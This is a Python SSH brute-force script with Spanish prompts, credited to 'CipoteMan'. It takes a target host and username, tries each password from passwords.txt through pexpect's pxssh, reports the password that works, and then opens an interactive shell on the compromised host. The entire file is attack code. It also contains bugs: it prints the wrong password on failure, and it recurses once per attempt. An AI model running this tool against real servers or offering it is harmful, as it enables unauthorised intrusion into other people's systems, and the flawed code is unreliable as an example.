import hashlib, os, time
from pexpect import pxssh
from urllib.request import urlopen

#Creado por CipoteMan

class SSH(object):
    def __init__(self):
        self.ip = input(r"Escribe el host: ")
        self.usuario = input(r"Escribe el usuario: ") 
        self.intento = 0


def main():
    clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')
    s = pxssh.pxssh()
    with open("passwords.txt","r") as f:
        global contra
        contra = f.readlines()
    try:
        con = s.login(ssh.ip, ssh.usuario, contra[ssh.intento])

        if con:
            print("Contrasena encontrada -> {}".format(contra[ssh.intento]))
            print("Te has conectado a {}@{}\n".format(ssh.usuario, ssh.ip))
            f.close()
            s.logout()
            s.close()
            return con_establecida()
    except Exception:
        ssh.intento = ssh.intento + 1
        print("Contrasena incorrecta -> ", contra[ssh.intento])
        f.close()
        s.close()
        time.sleep(0.3)
        return main()

def con_establecida():
    s = pxssh.pxssh()
    s.login(ssh.ip, ssh.usuario, contra[ssh.intento])
    while True:
        try:
            comando = input(r"-> ")
            s.sendline(comando)
            s.prompt()
            print(s.before.decode("UTF-8"))
            if comando == "salir":
                break
        except:
            print("Ha ocurrido un error, desconectando...")
            return 0


if __name__ == "__main__":
    ssh = SSH()
    main()